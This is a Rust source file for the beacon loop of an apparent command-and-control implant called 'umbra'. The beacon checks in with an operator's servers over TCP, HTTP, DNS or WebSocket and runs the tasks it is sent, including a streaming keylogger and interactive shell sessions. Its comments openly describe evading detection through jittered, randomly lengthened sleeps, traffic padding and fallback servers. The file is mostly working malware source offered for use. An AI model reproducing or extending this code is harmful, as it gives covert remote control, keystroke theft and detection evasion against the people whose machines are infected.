//! Beacon loop: handshake, check-in, task execution, jittered sleep.

use crate::config::{Config, Transport};
use crate::crypto;
use crate::session::Session;
use crate::sysinfo;
use crate::task;
use crate::transport::{Channel, HttpChannel, TcpChannel};
use crate::upk::{self, Value};
use crate::wire;

pub const VERSION: &str = env!("CARGO_PKG_VERSION");
pub const MAX_TASKS_PER_CYCLE: usize = 64;
/// Control frames (REKEY) tolerated before a TASK_BATCH.
// Control frames that may precede TASK_BATCH in one cycle: one REKEY plus up
// to four TASK_CANCEL frames (hub.MaxPendingCancels on the server).
const MAX_REKEY_ROUNDS: usize = 8;

pub struct Beacon {
    pub cfg: Config,
    session: Option<Session>,
    channel: Option<Box<dyn Channel>>,
    cycles: u64,
    failures: u32,
    /// The open sessions and the output they produced.
    ///
    /// A session outlives the connection: the operator writes to it and
    /// reads from it while it runs, so the beacon keeps the stream and
    /// sends the chunks as they arrive.
    backgrounds: std::collections::HashMap<String, (String, crate::sessions::Stream)>,
}

impl Beacon {
    pub fn new(cfg: Config) -> Self {
        Beacon {
            cfg,
            session: None,
            channel: None,
            cycles: 0,
            failures: 0,
            backgrounds: std::collections::HashMap::new(),
        }
    }

    fn log(&self, msg: &str) {
        if self.cfg.verbose {
            eprintln!("[umbra] {msg}");
        }
    }

    /// Run until `max_cycles` is reached (None = forever).
    pub fn run(&mut self, max_cycles: Option<u64>) -> Result<(), String> {
        loop {
            if let Some(limit) = max_cycles {
                if self.cycles >= limit {
                    return Ok(());
                }
            }
            match self.run_once() {
                Ok(true) => {
                    self.failures = 0;
                    self.cycles += 1;
                }
                Ok(false) => return Ok(()),
                Err(e) => {
                    self.failures = self.failures.saturating_add(1);
                    self.log(&format!("cycle failed ({e}), backing off"));
                    let backoff = self.backoff_secs();
                    sleep_secs(backoff);
                    continue;
                }
            }
            if let Some(limit) = max_cycles {
                if self.cycles >= limit {
                    return Ok(());
                }
            }
            sleep_secs(self.next_interval());
        }
    }

    fn backoff_secs(&self) -> u64 {
        let base = self.cfg.sleep.max(1);
        let factor = 1u64 << self.failures.min(5);
        (base * factor).min(300)
    }

    /// Sleep interval with jitter and obfuscation.
    ///
    /// The jitter spreads the check-ins around the configured interval:
    /// uniform in [sleep*(1-j), sleep*(1+j)].  The obfuscation adds an
    /// occasional long nap on top of it, because a uniform distribution is a
    /// signature of its own -- a beacon that checks in every 60.4 seconds on
    /// average is easier to find than one that sometimes sleeps for three
    /// minutes.
    fn next_interval(&self) -> u64 {
        let base = self.cfg.sleep.max(1) as f64;
        let j = (self.cfg.jitter.min(90) as f64) / 100.0;
        let lo = (base * (1.0 - j)).max(1.0);
        let hi = (base * (1.0 + j)).max(lo);
        let span = hi - lo;
        let r = random_unit();
        let mut interval = (lo + span * r) as u64;
        if self.cfg.sleep_obfuscate && random_unit() < 0.25 {
            // One check-in in four takes a long nap: 1.5 to 3.5 times the
            // jittered interval.
            let factor = 1.5 + 2.0 * random_unit();
            interval = ((interval as f64) * factor) as u64;
        }
        interval.max(1)
    }

    fn open_channel(&mut self) -> Result<(), String> {
        // The beacon knows more than one address: when the first server is
        // down, the next one is tried.  A server that moves does not take
        // the implant with it.
        let mut last = "no server configured".to_string();
        for server in self.servers() {
            match self.open_channel_to(&server) {
                Ok(()) => {
                    if server != self.cfg.server {
                        self.log(&format!("using the server {server}"));
                        self.cfg.server = server;
                    }
                    return Ok(());
                }
                Err(e) => last = e,
            }
        }
        Err(last)
    }

    /// The addresses the beacon dials, in order.
    fn servers(&self) -> Vec<String> {
        let mut out: Vec<String> = Vec::new();
        if !self.cfg.server.is_empty() {
            out.push(self.cfg.server.clone());
        }
        for extra in &self.cfg.servers {
            if !extra.is_empty() && !out.contains(extra) {
                out.push(extra.clone());
            }
        }
        out
    }

    /// Open the channel to one address.
    fn open_channel_to(&mut self, server: &str) -> Result<(), String> {
        let ch: Box<dyn Channel> = match self.cfg.transport {
            Transport::Tcp => {
                let mut c = TcpChannel::new(server);
                if !self.cfg.proxy.is_empty() {
                    // The beacon dials through a SOCKS5 proxy: the proxy
                    // carries the traffic to the team server.
                    c = c.with_proxy(&self.cfg.proxy);
                }
                c.connect().map_err(|e| format!("connect {server}: {e}"))?;
                Box::new(c)
            }
            Transport::Http => Box::new(
                HttpChannel::new(server, &self.cfg.http_path, &self.cfg.http_host_header)
                    .map_err(|e| format!("http channel: {e}"))?,
            ),
            Transport::Dns => Box::new(
                crate::dns::DnsChannel::new(
                    &self.cfg.dns_resolver,
                    &self.cfg.dns_domain,
                    &self.cfg.agent_id,
                )
                .map_err(|e| format!("dns channel: {e}"))?,
            ),
            Transport::Ws => Box::new(
                crate::ws::WsChannel::new(
                    server,
                    &self.cfg.ws_path,
                    &self.cfg.ws_host_header,
                )
                .map_err(|e| format!("websocket channel: {e}"))?,
            ),
        };
        self.channel = Some(ch);
        Ok(())
    }

    fn run_once(&mut self) -> Result<bool, String> {
        self.session = None;
        self.open_channel()?;
        self.handshake()?;
        let mut keep_running = self.cycle()?;
        // A live session keeps the connection open: the operator writes to it
        // and reads from it while it runs, so the beacon stays connected
        // instead of sleeping between the check-ins.
        while keep_running && !self.backgrounds.is_empty() {
            self.drain_backgrounds()?;
            if self.backgrounds.is_empty() {
                break;
            }
            sleep_secs(1);
            keep_running = self.cycle()?;
        }
        self.drain_backgrounds()?;
        // Traffic padding: the last request of a cycle is padded to a bucket
        // size, so its length does not tell how much work the cycle carried.
        self.pad_pending()?;
        if let Some(ch) = self.channel.as_mut() {
            let _ = ch.flush();
            ch.close();
        }
        self.channel = None;
        self.session = None;
        Ok(keep_running)
    }

    /// Pad the pending request to a bucket size.
    ///
    /// The padding is a sealed PADDING frame with a random body: the server
    /// ignores it, and only the length of the request becomes uniform.  The
    /// size of the frame depends on the length prefix of its body, so the
    /// body length is solved for instead of guessed.
    fn pad_pending(&mut self) -> Result<(), String> {
        let bucket = self.cfg.http_pad as usize;
        if bucket == 0 {
            return Ok(());
        }
        let pending = match self.channel.as_mut() {
            Some(ch) => ch.pending_len(),
            None => 0,
        };
        if pending == 0 {
            return Ok(());
        }
        // The fixed part of a frame: prelude, nonce, the upk tag of the body
        // and the authentication tag.
        let overhead = wire::HEADER_LEN + wire::TAG_LEN + 1;
        let target = (pending + overhead + bucket - 1) / bucket * bucket;
        for prefix in 1..=3usize {
            let length = target as isize - pending as isize - overhead as isize - prefix as isize;
            if length < 0 {
                continue;
            }
            let length = length as usize;
            if uvarint_len(length as u64) != prefix {
                continue;
            }
            let body = crate::crypto::random_bytes(length);
            let value = upk::Value::Bin(body);
            let frame = self.seal(wire::MSG_PADDING, &value)?;
            if pending + frame.len() != target {
                self.log("the padding did not reach the bucket");
            }
            self.write(&frame)?;
            return Ok(());
        }
        Ok(())
    }

    // -- handshake -------------------------------------------------------
    /// The handshake is the shared client half of the protocol; the pivot
    /// callback uses the very same code, so the two can never drift apart.
    fn handshake(&mut self) -> Result<(), String> {
        let suites = crypto::supported_suites();
        let suite = *suites.first().ok_or("no AEAD suite compiled in")?;
        let meta = sysinfo::meta(VERSION);
        let handshake = {
            let channel = self.channel.as_mut().ok_or("the channel is closed")?;
            crate::link::client_handshake(
                channel.as_mut(),
                &self.cfg.psk,
                crypto::ROLE_AGENT,
                &self.cfg.agent_id,
                suite,
                meta,
            )?
        };
        let session_id = handshake.session_id.clone();
        self.session = Some(handshake.session);

        if let Some(cfg) = handshake.ack.get("cfg") {
            let sleep = cfg.u64_or("sleep", self.cfg.sleep);
            let jitter = cfg.u64_or("jitter", self.cfg.jitter as u64) as u32;
            let obfuscate = cfg.bool_or("obf", self.cfg.sleep_obfuscate);
            self.apply_policy(sleep, jitter);
            self.cfg.sleep_obfuscate = obfuscate;
        }
        if let Some(ch) = self.channel.as_mut() {
            ch.set_session_id(&crate::config::hex_encode(&session_id));
        }
        self.log("handshake complete");
        Ok(())
    }

    fn apply_policy(&mut self, sleep: u64, jitter: u32) {
        if sleep > 0 {
            self.cfg.sleep = sleep;
        }
        if jitter <= 90 {
            self.cfg.jitter = jitter;
        }
    }

    /// The context the tasks get: identity, key and C2 address.
    fn context(&self) -> task::Context {
        task::Context {
            psk: self.cfg.psk.clone(),
            agent_id: self.cfg.agent_id.clone(),
            server: self.cfg.server.clone(),
            verbose: self.cfg.verbose,
        }
    }

    // -- one beacon cycle ------------------------------------------------
    fn cycle(&mut self) -> Result<bool, String> {
        let ts = now_secs();
        let checkin = upk::map(vec![("ts", upk::u(ts)), ("n", upk::u(0))]);
        let frame = self.seal(wire::MSG_CHECKIN, &checkin)?;
        self.write(&frame)?;

        // The server may rotate keys right before the batch. A REKEY frame is
        // always sealed with the OLD key set and is always followed by
        // TASK_BATCH, so read until the batch arrives instead of guessing a
        // frame count. Bound the loop so a hostile server cannot stall us.
        let mut batch = upk::map(vec![]);
        let mut cancelled: Vec<String> = Vec::new();
        let mut seen = 0;
        loop {
            seen += 1;
            if seen > MAX_REKEY_ROUNDS {
                return Err("too many control frames before TASK_BATCH".to_string());
            }
            let resp = self.read()?;
            let (msg_type, body) = self.open(&resp)?;
            match msg_type {
                wire::MSG_REKEY => {
                    let seed = body.bin_or("seed", &[]);
                    if seed.len() != 32 {
                        return Err("malformed REKEY seed".to_string());
                    }
                    if let Some(sess) = self.session.as_mut() {
                        sess.apply_rekey(&seed).map_err(|e| format!("rekey: {e}"))?;
                        self.log("session rekeyed");
                    }
                }
                wire::MSG_TASK_CANCEL => {
                    // The operator cancelled a task that this beacon had already
                    // received. Record it and keep reading: the batch that
                    // follows is the one that decides what runs.
                    let id = body.str_or("id", "");
                    if id.is_empty() {
                        return Err("TASK_CANCEL without a task id".to_string());
                    }
                    self.log(&format!("task {id} cancelled by operator"));
                    cancelled.push(id);
                }
                wire::MSG_TASK_BATCH => {
                    batch = body;
                    break;
                }
                wire::MSG_KILL => {
                    self.log("server sent KILL");
                    return Ok(false);
                }
                wire::MSG_PADDING => {
                    // Padding frames carry random bytes and are ignored: they
                    // only make the traffic shape uniform.
                }
                other => {
                    return Err(format!("expected TASK_BATCH, got {}", wire::type_name(other)))
                }
            }
        }

        // Server-side beacon policy wins over the compiled-in defaults.
        self.apply_policy(batch.u64_or("sleep", self.cfg.sleep), batch.u64_or("jitter", self.cfg.jitter as u64) as u32);
        // The server also decides whether the check-in pattern is obfuscated.
        self.cfg.sleep_obfuscate = batch.bool_or("obf", self.cfg.sleep_obfuscate);

        let tasks = match batch.get("tasks") {
            Some(Value::Arr(items)) => items.clone(),
            _ => Vec::new(),
        };
        for (idx, t) in tasks.iter().enumerate() {
            if idx >= MAX_TASKS_PER_CYCLE {
                break;
            }
            let id = t.str_or("id", "");
            let kind = t.str_or("kind", "");
            let args = t.get("args").cloned().unwrap_or_else(|| upk::map(vec![]));

            if cancelled.iter().any(|c| c == &id) {
                // Still report: the server keeps the cancelled state and stores
                // the output, so the operator sees that nothing ran.
                self.log(&format!("task {id} skipped (cancelled)"));
                let outcome = task::Outcome::err(125, "cancelled before execution");
                self.send_result(&id, &outcome)?;
                continue;
            }
            self.log(&format!("task {id} kind={kind}"));

            match kind.as_str() {
                "keylog" => {
                    // The key logger streams the keys while it runs, exactly
                    // like a session does.
                    let seconds = args.u64_or("seconds", 60);
                    match crate::desktop::keylog(seconds) {
                        Ok(stream) => {
                            let sid = format!("k-{}", crate::config::hex_encode(
                                &crate::crypto::random_bytes(4)));
                            self.log(&format!("key logger {sid} started"));
                            let value = upk::map(vec![
                                ("id", upk::s(&id)),
                                ("code", upk::i(0)),
                                ("out", upk::bin(&[])),
                                ("err", upk::s("")),
                                ("partial", upk::bool_(true)),
                                ("session", upk::s(&sid)),
                            ]);
                            let frame = self.seal(wire::MSG_RESULT, &value)?;
                            self.write(&frame)?;
                            self.backgrounds.insert(id.clone(), (sid, stream));
                        }
                        Err(e) => {
                            let outcome = task::Outcome::err(1, e);
                            self.send_result(&id, &outcome)?;
                        }
                    }
                }
                "session.open" => {
                    // The session outlives the task: the beacon keeps the
                    // stream, sends the output as partial results and
                    // completes the task when the session ends.
                    let cmd = args.str_or("cmd", "");
                    match crate::sessions::open(&cmd) {
                        Ok((sid, stream)) => {
                            self.log(&format!("session {sid} opened"));
                            // The session id travels with the first chunk, so
                            // the operator can address the session before it
                            // produced any output at all.
                            let value = upk::map(vec![
                                ("id", upk::s(&id)),
                                ("code", upk::i(0)),
                                ("out", upk::bin(&[])),
                                ("err", upk::s("")),
                                ("partial", upk::bool_(true)),
                                ("session", upk::s(&sid)),
                            ]);
                            let frame = self.seal(wire::MSG_RESULT, &value)?;
                            self.write(&frame)?;
                            self.backgrounds.insert(id.clone(), (sid, stream));
                        }
                        Err(e) => {
                            let outcome = task::Outcome::err(1, e);
                            self.send_result(&id, &outcome)?;
                        }
                    }
                }
                "exit" | "kill" => {
                    let outcome = task::run(&self.context(), &kind, &args);
                    self.send_result(&id, &outcome)?;
                    self.send_bye()?;
                    return Ok(false);
                }
                "sleep" => {
                    let sleep = args.u64_or("sleep", self.cfg.sleep);
                    let jitter = args.u64_or("jitter", self.cfg.jitter as u64) as u32;
                    self.apply_policy(sleep, jitter);
                    let outcome = task::run(&self.context(), "sleep", &args);
                    self.send_result(&id, &outcome)?;
                }
                _ => {
                    let outcome = task::run(&self.context(), &kind, &args);
                    self.send_result(&id, &outcome)?;
                }
            }
        }

        self.send_bye()?;
        Ok(true)
    }

    /// Send the output the open sessions produced.
    ///
    /// A chunk is a partial result: the task is still running, so the server
    /// appends the chunk instead of completing the task.  When a session ends,
    /// its exit status completes the task.
    fn drain_backgrounds(&mut self) -> Result<(), String> {
        // Collect first and send afterwards: sending borrows the session.
        let mut pending: Vec<(String, String, Vec<u8>)> = Vec::new();
        let mut finished: Vec<(String, task::Outcome)> = Vec::new();
        for (id, (sid, stream)) in self.backgrounds.iter_mut() {
            while let Ok(chunk) = stream.rx.try_recv() {
                pending.push((id.clone(), sid.clone(), chunk));
            }
            if let Some(result) = stream.outcome() {
                let outcome = match result {
                    Ok(o) => o,
                    Err(e) => task::Outcome::err(1, e),
                };
                finished.push((id.clone(), outcome));
            }
        }
        for (id, sid, chunk) in pending {
            let value = upk::map(vec![
                ("id", upk::s(&id)),
                ("code", upk::i(0)),
                ("out", upk::bin(&chunk)),
                ("err", upk::s("")),
                ("partial", upk::bool_(true)),
                ("session", upk::s(&sid)),
            ]);
            let frame = self.seal(wire::MSG_RESULT, &value)?;
            self.write(&frame)?;
        }
        for (id, outcome) in finished {
            self.backgrounds.remove(&id);
            self.send_result(&id, &outcome)?;
        }
        Ok(())
    }

    fn send_result(&mut self, task_id: &str, outcome: &task::Outcome) -> Result<(), String> {
        let value = outcome.to_value(task_id);
        let frame = self.seal(wire::MSG_RESULT, &value)?;
        self.write(&frame)
    }

    fn send_bye(&mut self) -> Result<(), String> {
        let frame = self.seal(wire::MSG_BYE, &upk::map(vec![]))?;
        self.write(&frame)?;
        if let Some(ch) = self.channel.as_mut() {
            let _ = ch.flush();
        }
        Ok(())
    }

    // -- plumbing --------------------------------------------------------
    fn seal(&mut self, msg_type: u8, value: &Value) -> Result<Vec<u8>, String> {
        let sess = self.session.as_mut().ok_or("no session")?;
        sess.seal_value(msg_type, value).map_err(|e| format!("seal: {e}"))
    }

    fn open(&mut self, frame: &[u8]) -> Result<(u8, Value), String> {
        let sess = self.session.as_mut().ok_or("no session")?;
        sess.open_value(frame).map_err(|e| format!("open: {e}"))
    }

    fn write(&mut self, frame: &[u8]) -> Result<(), String> {
        let ch = self.channel.as_mut().ok_or("no channel")?;
        ch.write_frame(frame).map_err(|e| format!("write: {e}"))
    }

    fn read(&mut self) -> Result<Vec<u8>, String> {
        let ch = self.channel.as_mut().ok_or("no channel")?;
        ch.read_frame().map_err(|e| format!("read: {e}"))
    }
}

fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn random_unit() -> f64 {
    let b = crypto::random_bytes(8);
    let mut v = [0u8; 8];
    v.copy_from_slice(&b);
    let n = u64::from_le_bytes(v) >> 11;
    (n as f64) / ((1u64 << 53) as f64)
}

fn sleep_secs(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs.max(1)));
}

/// Constant-time comparison for authentication tags.
pub fn ct_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        diff |= x ^ y;
    }
    diff == 0
}

/// The number of bytes an uvarint of n occupies.
fn uvarint_len(n: u64) -> usize {
    let mut size = 1;
    let mut value = n;
    while value >= 0x80 {
        value >>= 7;
        size += 1;
    }
    size
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ct_eq_behaves() {
        assert!(ct_eq(b"abc", b"abc"));
        assert!(!ct_eq(b"abc", b"abd"));
        assert!(!ct_eq(b"abc", b"ab"));
    }

    #[test]
    fn the_sleep_is_obfuscated() {
        let mut cfg = Config {
            server: "127.0.0.1:1".into(),
            transport: Transport::Tcp,
            http_path: "/api/v1/beacon".into(),
            agent_id: "test".into(),
            psk: vec![1u8; 32],
            sleep: 100,
            jitter: 20,
            verbose: false,
            dns_resolver: "127.0.0.1:5353".into(),
            dns_domain: "umbra.local".into(),
            ws_path: "/api/v1/beacon".into(),
            ws_host_header: String::new(),
            http_host_header: String::new(),
            http_pad: 0,
            sleep_obfuscate: true,
        };
        let b = Beacon::new(cfg);
        let mut long = 0;
        for _ in 0..200 {
            let v = b.next_interval();
            assert!(v >= 1, "interval {v} is not positive");
            if v > 120 {
                long += 1;
            }
        }
        // The obfuscation has to show up, otherwise it does nothing.
        assert!(long > 0, "the sleep was never obfuscated");
        assert!(long < 200, "every check-in was obfuscated");
    }

    #[test]
    fn jitter_stays_in_window() {
        let mut cfg = Config {
            server: "127.0.0.1:1".into(),
            transport: Transport::Tcp,
            http_path: "/api/v1/beacon".into(),
            agent_id: "test".into(),
            psk: vec![1u8; 32],
            sleep: 100,
            jitter: 20,
            verbose: false,
            dns_resolver: "127.0.0.1:5353".into(),
            dns_domain: "umbra.local".into(),
            ws_path: "/api/v1/beacon".into(),
            ws_host_header: String::new(),
            http_host_header: String::new(),
            http_pad: 0,
            sleep_obfuscate: false,
        };
        cfg.sleep = 100;
        let b = Beacon::new(cfg);
        for _ in 0..200 {
            let v = b.next_interval();
            assert!((80..=120).contains(&v), "interval {v} outside jitter window");
        }
    }
}
